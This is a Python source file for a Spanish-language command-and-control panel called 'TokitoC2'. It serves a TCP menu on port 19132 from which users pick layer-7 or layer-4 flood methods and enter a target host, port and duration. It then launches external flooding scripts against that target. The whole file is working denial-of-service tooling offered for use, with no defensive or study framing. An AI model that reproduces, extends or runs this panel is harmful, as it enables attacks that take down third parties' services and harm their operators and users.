import socket
import threading
import subprocess
import os

# Colores ANSI
GREEN   = "\033[32m"
RED     = "\033[31m"
CYAN    = "\033[36m"
YELLOW  = "\033[33m"
MAGENTA = "\033[35m"
BLUE    = "\033[34m"
RESET   = "\033[0m"
CLEAR_SCREEN = "\033[2J\033[H"

logo = """
 _______    _    _ _           _____ ___  
|__   __|  | |  (_) |         / ____|__ \\
   | | ___ | | ___| |_ ___   | |       ) |
   | |/ _ \\| |/ / | __/ _ \\  | |      / / 
   | | (_) |   <| | || (_) | | |____ / /_ 
   |_|\\___/|_|\\_\\_|\\__\\___/   \\_____|____|
"""

L7_METHODS = ["HTTP", "OVH-HTTP", "HTTP2", "BYPASS", "ACK", "NFO", "MC", "TCP"]
L4_METHODS = ["UDP", "TCP", "SYN", "R6", "NFO", "XSYN", "TCPRAIL", "UDP-XV", "OVH", "PATH", "UDPPS"]
TOOLS      = ["PING"]

HOST = "0.0.0.0"
PORT = 19132

def send(cs, msg=""):
    for line in msg.splitlines():
        cs.sendall(f"{BLUE}[TokitoC2 ~]# {line}{RESET}\n".encode("utf-8"))

def banner(cs):
    send(cs, logo)

def show_main_menu(cs):
    banner(cs)
    send(cs, ">> Ingrese HELP para ver la lista de comandos")

def show_methods(cs):
    send(cs, "✨ Métodos Nivel 7 (L7):")
    send(cs, ", ".join(L7_METHODS))
    send(cs, "⚡ Métodos Nivel 4 (L4):")
    send(cs, ", ".join(L4_METHODS))

def show_tools(cs):
    send(cs, "🛠️ Herramientas disponibles:")
    send(cs, ", ".join(TOOLS))

def show_help(cs):
    show_main_menu(cs)

def clean_cmd(cmd):
    return cmd.lstrip("!").strip().lower()

def handle_client(cs):
    step = 0
    method = target = ""
    portNum = timeSec = 0

    cs.sendall(CLEAR_SCREEN.encode())  # Limpia pantalla solo una vez al iniciar
    show_main_menu(cs)

    try:
        while True:
            cs.sendall(f"{BLUE}[TokitoC2 ~]# {RESET}".encode())
            data = cs.recv(1024)
            if not data:
                break
            cmd_raw = data.decode().strip()
            cmd = clean_cmd(cmd_raw)

            # Comando directo: attack METHOD IP dport=PORT DURATION
            if cmd.startswith("attack ") and step == 0:
                parts = cmd.split()
                if len(parts) == 5 and parts[3].startswith("dport="):
                    method = parts[1].upper()
                    target = parts[2]
                    try:
                        portNum = int(parts[3][6:])
                        timeSec = int(parts[4])
                    except:
                        send(cs, "Formato inválido. Usa: attack METHOD IP dport=PORT DURATION")
                        continue
                    if method not in L7_METHODS + L4_METHODS + TOOLS:
                        send(cs, "Método inválido. Usa methods para ver la lista.")
                        continue
                    if method == "PING":
                        send(cs, "🏓 Ejecutando ping... (no implementado)")
                        send(cs, "Ping completado.")
                        show_main_menu(cs)
                        continue
                    # Lanzar ataque directamente
                    send(cs, f"Iniciando ataque {method} → {target}:{portNum} por {timeSec} segundos")
                    if method in L7_METHODS:
                        cmd_list = ["node", "http.js", target, str(portNum), str(timeSec)]
                    elif method == "UDPPS":
                        cmd_list = ["python", "udpps.py", target, str(portNum), str(timeSec)]
                    else:
                        cmd_list = ["node", "udp.js", target, str(portNum), str(timeSec)]
                    proc = subprocess.Popen(cmd_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    while True:
                        out = proc.stdout.readline()
                        err = proc.stderr.readline()
                        if out:
                            send(cs, out.strip())
                        if err:
                            send(cs, err.strip())
                        if not out and not err and proc.poll() is not None:
                            break
                    send(cs, "Ataque finalizado.")
                    show_main_menu(cs)
                    continue

            # Modo paso a paso
            if step == 0:
                if cmd == "help":
                    show_help(cs)
                elif cmd == "methods":
                    show_methods(cs)
                elif cmd == "tools":
                    show_tools(cs)
                elif cmd == "attack":
                    send(cs, "→ Ingresa el método de ataque:")
                    step = 1
                else:
                    send(cs, "Comando desconocido. Usa help.")
            elif step == 1:
                method = cmd.upper()
                if method in L7_METHODS + L4_METHODS + TOOLS:
                    if method == "PING":
                        send(cs, "🏓 Ejecutando ping... (no implementado)")
                        send(cs, "Ping completado.")
                        show_main_menu(cs)
                        step = 0
                    else:
                        send(cs, "Ingresa la IP o host objetivo:")
                        step = 2
                else:
                    send(cs, "Método inválido. Usa methods para ver la lista.")
            elif step == 2:
                target = cmd_raw
                send(cs, "Ingresa el puerto (1-65535):")
                step = 3
            elif step == 3:
                try:
                    portNum = int(cmd_raw)
                    assert 1 <= portNum <= 65535
                except:
                    send(cs, "Puerto inválido.")
                    continue
                send(cs, "Ingresa la duración en segundos:")
                step = 4
            elif step == 4:
                try:
                    timeSec = int(cmd_raw)
                    assert timeSec > 0
                except:
                    send(cs, "Duración inválida.")
                    continue
                send(cs, f"Iniciando ataque {method} → {target}:{portNum} por {timeSec} segundos")
                if method in L7_METHODS:
                    cmd_list = ["node", "http.js", target, str(portNum), str(timeSec)]
                elif method == "UDPPS":
                    cmd_list = ["python", "udpps.py", target, str(portNum), str(timeSec)]
                else:
                    cmd_list = ["node", "udp.js", target, str(portNum), str(timeSec)]
                proc = subprocess.Popen(cmd_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                while True:
                    out = proc.stdout.readline()
                    err = proc.stderr.readline()
                    if out:
                        send(cs, out.strip())
                    if err:
                        send(cs, err.strip())
                    if not out and not err and proc.poll() is not None:
                        break
                send(cs, "Ataque finalizado.")
                show_main_menu(cs)
                step = 0

    finally:
        cs.close()

def main():
    os.system("clear")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"{GREEN}[TokitoC2] Servidor en {HOST}:{PORT}{RESET}")
    while True:
        client, addr = server.accept()
        print(f"{CYAN}Conexión desde {addr[0]}:{addr[1]}{RESET}")
        threading.Thread(target=handle_client, args=(client,), daemon=True).start()

if __name__ == "__main__":
    main()
